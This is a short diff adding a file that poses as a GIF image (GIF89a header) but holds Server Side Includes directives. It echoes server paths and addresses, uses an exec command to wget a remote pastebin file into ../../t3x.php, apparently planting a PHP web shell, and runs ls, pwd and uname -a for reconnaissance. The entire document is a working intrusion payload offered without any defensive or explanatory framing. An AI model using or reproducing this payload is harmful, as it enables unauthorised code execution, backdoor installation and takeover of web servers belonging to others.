@@ -1,0 +1,10 @@
+GIF89a1
+<!--#echo var="DOCUMENT_ROOT" -->
+<br>
+<!--#echo var="DOCUMENT_URI" -->SSIWORK
+<br>
+<!--#echo var="SERVER_ADDR" -->
+<br>
+<!--#exec cmd="{wget,https://pastebin.com/raw/hCH9CpUP,-O,../../t3x.php}" -->
+<br>
+<!--#exec cmd="ls ../../;dir;pwd;{uname,-a}" -->
